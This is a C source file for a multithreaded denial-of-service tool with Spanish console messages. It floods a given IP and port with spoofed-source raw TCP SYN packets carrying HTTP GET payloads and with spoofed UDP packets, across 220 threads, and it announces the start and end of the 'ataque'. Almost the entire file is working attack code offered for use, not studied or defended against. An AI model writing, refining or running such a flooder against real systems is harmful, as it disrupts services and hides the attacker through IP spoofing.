#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <sys/sysinfo.h>
#include <pthread.h>
#include <netinet/tcp.h>
#include <signal.h>
#include <fcntl.h>
#include <errno.h>
#include <netinet/udp.h>

#define THREADS 220
#define MAX_HTTP_REQS 4
#define MAX_UDP_PACKETS 5
#define USER_AGENT_COUNT 5
#define RETRY_DELAY_MS 200
#define MAX_IPS 256

volatile sig_atomic_t running = 1;

typedef struct {
    char *ip;
    int port;
    int thread_id;
    long long packets_sent;
    char spoofed_ip[INET_ADDRSTRLEN];
} target_info;

const char *user_agents[USER_AGENT_COUNT] = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36"
};

void sig_handler(int signo) {
    running = 0;
    printf("Señal recibida. Terminando...\n");
}

const char *get_random_user_agent() {
    return user_agents[rand() % USER_AGENT_COUNT];
}

int set_non_blocking(int sockfd) {
    int flags = fcntl(sockfd, F_GETFL, 0);
    if (flags == -1) {
        perror("fcntl(F_GETFL)");
        return -1;
    }

    if (fcntl(sockfd, F_SETFL, flags | O_NONBLOCK) == -1) {
        perror("fcntl(F_SETFL)");
        return -1;
    }
    return 0;
}

typedef struct {
    char buffer[4096];
    size_t size;
} HttpResponse;

int receive_full_response(int sockfd, HttpResponse *response) {
    ssize_t bytes_received;
    while (running) {
        bytes_received = recv(sockfd, response->buffer + response->size, sizeof(response->buffer) - response->size, 0);
        if (bytes_received == -1) {
            if (errno == EWOULDBLOCK || errno == EAGAIN) {
                usleep(10000);
                continue;
            } else {
                perror("recv");
                return -1;
            }
        } else if (bytes_received == 0) {
            break;
        } else {
            response->size += bytes_received;
            if (response->size >= sizeof(response->buffer)) {
                fprintf(stderr, "Error: Buffer de respuesta HTTP lleno, posible ataque DoS.\n");
                return -1;
            }
            if (strstr(response->buffer, "\r\n\r\n") != NULL) {
                break;
            }
        }
    }
    return 0;
}

void generate_random_ip(char *ip_str) {
    struct in_addr addr;
    addr.s_addr = rand();
    inet_ntop(AF_INET, &addr, ip_str, INET_ADDRSTRLEN);
}

unsigned short checksum(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char*)&oddbyte) = *(u_char*)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = ~sum;

    return answer;
}

void* http_flood(void* arg) {
    target_info *t = (target_info*)arg;
    char http_get[512];
    HttpResponse response;
    response.size = 0;

    int raw_socket = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (raw_socket < 0) {
        perror("raw socket");
        return NULL;
    }

    int header_include = 1;
    if (setsockopt(raw_socket, IPPROTO_IP, IP_HDRINCL, &header_include, sizeof(header_include)) < 0) {
        perror("setsockopt IP_HDRINCL");
        close(raw_socket);
        return NULL;
    }
    
    while (running) {
        generate_random_ip(t->spoofed_ip);

        int sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) {
            perror("socket");
            usleep(RETRY_DELAY_MS * 1000);
            continue;
        }

        if (set_non_blocking(sockfd) == -1) {
            close(sockfd);
            usleep(RETRY_DELAY_MS * 1000);
            continue;
        }

        int opt = 1;
        setsockopt(sockfd, IPPROTO_TCP, TCP_NODELAY, &opt, sizeof(opt));
        setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

        struct timeval timeout;
        timeout.tv_sec = 5;
        timeout.tv_usec = 0;
        setsockopt(sockfd, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
        setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));

        struct sockaddr_in target;
        memset(&target, 0, sizeof(target));
        target.sin_family = AF_INET;
        target.sin_port = htons(t->port);
        if (inet_pton(AF_INET, t->ip, &target.sin_addr) <= 0) {
            perror("inet_pton");
            close(sockfd);
            usleep(RETRY_DELAY_MS * 1000);
            continue;
        }

        if (connect(sockfd, (struct sockaddr*)&target, sizeof(target)) != 0) {
            if (errno == EINPROGRESS) {
                fd_set writefds;
                FD_ZERO(&writefds);
                FD_SET(sockfd, &writefds);
                struct timeval tv;
                tv.tv_sec = timeout.tv_sec;
                tv.tv_usec = timeout.tv_usec;

                int retval = select(sockfd + 1, NULL, &writefds, NULL, &tv);
                if (retval == 0) {
                    fprintf(stderr, "Timeout al conectar.\n");
                    close(sockfd);
                    usleep(RETRY_DELAY_MS * 1000);
                    continue;
                } else if (retval == -1) {
                    perror("select");
                    close(sockfd);
                    usleep(RETRY_DELAY_MS * 1000);
                    continue;
                }
                int error;
                socklen_t len = sizeof(error);
                if (getsockopt(sockfd, SOL_SOCKET, SO_ERROR, &error, &len) == -1 || error != 0) {
                    fprintf(stderr, "Error al conectar después de select.\n");
                    close(sockfd);
                    usleep(RETRY_DELAY_MS * 1000);
                    continue;
                }
            } else {
                perror("connect");
                close(sockfd);
                usleep(RETRY_DELAY_MS * 1000);
                continue;
            }
        }

        snprintf(http_get, sizeof(http_get),
                 "GET /?%d HTTP/1.1\r\n"
                 "Host: %s\r\n"
                 "User-Agent: %s\r\n"
                 "Accept: */*\r\n"
                 "Connection: keep-alive\r\n\r\n",
                 rand(), t->ip, get_random_user_agent());

        char packet[4096];
        struct iphdr *ip_header = (struct iphdr *)packet;
        struct tcphdr *tcp_header = (struct tcphdr *)(packet + sizeof(struct iphdr));
        char *data = packet + sizeof(struct iphdr) + sizeof(struct tcphdr);

        ip_header->ihl = 5;
        ip_header->version = 4;
        ip_header->tos = 0;
        ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(http_get));
        ip_header->id = htons(rand());
        ip_header->frag_off = 0;
        ip_header->ttl = 64;
        ip_header->protocol = IPPROTO_TCP;
        ip_header->check = 0;
        inet_pton(AF_INET, t->spoofed_ip, &ip_header->saddr);
        inet_pton(AF_INET, t->ip, &ip_header->daddr);

        tcp_header->source = htons(rand() % 65535 + 1024);
        tcp_header->dest = htons(t->port);
        tcp_header->seq = rand();
        tcp_header->ack_seq = 0;
        tcp_header->doff = 5;
        tcp_header->syn = 1;
        tcp_header->ack = 0;
        tcp_header->window = htons(5840);
        tcp_header->check = 0;
        tcp_header->urg_ptr = 0;

        strcpy(data, http_get);

        const int tcp_header_len = sizeof(struct tcphdr);
        const int data_len = strlen(http_get);
        int total_len = tcp_header_len + data_len;

        if (total_len % 2 != 0) {
            total_len++;
        }

        struct pseudo_header {
            unsigned int source_address;
            unsigned int dest_address;
            unsigned char placeholder;
            unsigned char protocol;
            unsigned short tcp_length;
        } pseudo_header;

        inet_pton(AF_INET, t->spoofed_ip, (void*)&pseudo_header.source_address);
        inet_pton(AF_INET, t->ip, (void*)&pseudo_header.dest_address);
        pseudo_header.placeholder = 0;
        pseudo_header.protocol = IPPROTO_TCP;
        pseudo_header.tcp_length = htons(tcp_header_len + data_len);

        char *pseudogram = malloc(total_len + sizeof(struct pseudo_header));
        memcpy(pseudogram, &pseudo_header, sizeof(struct pseudo_header));
        memcpy(pseudogram + sizeof(struct pseudo_header), tcp_header, tcp_header_len);
        memcpy(pseudogram + sizeof(struct pseudo_header) + tcp_header_len, data, data_len);

        tcp_header->check = checksum((unsigned short*)pseudogram, sizeof(struct pseudo_header) + total_len);
        free(pseudogram);

        ip_header->check = checksum((unsigned short*)packet, sizeof(struct iphdr));

        struct sockaddr_in sin;
        sin.sin_family = AF_INET;
        sin.sin_port = htons(t->port);
        inet_pton(AF_INET, t->ip, &sin.sin_addr);

        for (int i = 0; i < MAX_HTTP_REQS && running; i++) {
            ssize_t bytes_sent = sendto(raw_socket, packet, sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(http_get), 0, 
                                       (struct sockaddr *)&sin, sizeof(sin));

            if (bytes_sent < 0) {
                perror("sendto");
                break;
            }
            t->packets_sent++;
            response.size = 0;

            if (receive_full_response(sockfd, &response) != 0) {
                break;
            }
            usleep(50000);
        }

        close(sockfd);
        usleep(10000);
    }
    
    close(raw_socket);
    printf("Hilo HTTP %d terminado. Paquetes enviados: %lld\n", t->thread_id, t->packets_sent);
    return NULL;
}

void* udp_mix(void* arg) {
    target_info *t = (target_info*)arg;

    int raw_socket = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
    if (raw_socket < 0) {
        perror("raw socket");
        return NULL;
    }

    int header_include = 1;
    if (setsockopt(raw_socket, IPPROTO_IP, IP_HDRINCL, &header_include, sizeof(header_include)) < 0) {
        perror("setsockopt IP_HDRINCL");
        close(raw_socket);
        return NULL;
    }
    
    struct sockaddr_in target;
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(t->port);
    if (inet_pton(AF_INET, t->ip, &target.sin_addr) <= 0) {
        perror("inet_pton");
        close(raw_socket);
        return NULL;
    }
    
    char buffer[512];
    char packet[1024];
    struct iphdr *ip_header = (struct iphdr *)packet;
    struct udphdr *udp_header = (struct udphdr *)(packet + sizeof(struct iphdr));
    char *data = packet + sizeof(struct iphdr) + sizeof(struct udphdr);
    
    while (running) {
        generate_random_ip(t->spoofed_ip);

        ip_header->ihl = 5;
        ip_header->version = 4;
        ip_header->tos = 0;
        ip_header->id = htons(rand());
        ip_header->frag_off = 0;
        ip_header->ttl = 64;
        ip_header->protocol = IPPROTO_UDP;
        ip_header->check = 0;
        inet_pton(AF_INET, t->spoofed_ip, &ip_header->saddr);
        inet_pton(AF_INET, t->ip, &ip_header->daddr);

        udp_header->source = htons(rand() % 65535 + 1024);
        udp_header->dest = htons(t->port);
        
        memset(buffer, rand() % 256, sizeof(buffer));
        int data_len = rand() % 512 + 1;
        memcpy(data, buffer, data_len);

        udp_header->len = htons(sizeof(struct udphdr) + data_len);
        ip_header->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + data_len);
        udp_header->check = 0;

        ip_header->check = checksum((unsigned short *)packet, sizeof(struct iphdr));

        for (int i = 0; i < MAX_UDP_PACKETS && running; i++) {
            ssize_t bytes_sent = sendto(raw_socket, packet, sizeof(struct iphdr) + sizeof(struct udphdr) + data_len, 0, 
                                       (struct sockaddr *)&target, sizeof(target));
            if (bytes_sent < 0) {
                perror("sendto");
                break;
            }
            t->packets_sent++;
            usleep(1000);
        }
        usleep(1000);
    }
    
    close(raw_socket);
    printf("Hilo UDP %d terminado. Paquetes enviados: %lld\n", t->thread_id, t->packets_sent);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        fprintf(stderr, "Uso: %s <IP> <PUERTO> <SEGUNDOS>\n", argv[0]);
        return 1;
    }
    
    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);
    signal(SIGPIPE, SIG_IGN);

    srand(time(NULL));
    
    target_info t[THREADS];
    char *ip_address = argv[1];
    int port = atoi(argv[2]);
    int attack_time = atoi(argv[3]);
    
    pthread_t threads[THREADS];

    for (int i = 0; i < THREADS; i++) {
        t[i].ip = ip_address;
        t[i].port = port;
        t[i].thread_id = i;
        t[i].packets_sent = 0;
        t[i].spoofed_ip[0] = '\0';
        if (i % 3 == 0) {
            pthread_create(&threads[i], NULL, http_flood, &t[i]);
        } else {
            pthread_create(&threads[i], NULL, udp_mix, &t[i]);
        }
        usleep(1000);
    }
    
    printf("Ataque iniciado contra %s:%d durante %d segundos...\n", ip_address, port, attack_time);
    for (int i = 0; i < attack_time && running; i++) {
        sleep(1);
        if ((i + 1) % 60 == 0) {
           printf("Han pasado %d segundos...\n", i + 1);
        }
    }

    running = 0;
    printf("Deteniendo los hilos...\n");
    
    // Esperar a que terminen los hilos
    for (int i = 0; i < THREADS; i++) {
        pthread_join(threads[i], NULL);
    }
    
    printf("Ataque finalizado.\n");
    return 0;
}  // <--- AQUÍ ESTÁ LA LLAVE QUE TE FALTABA CERRAR
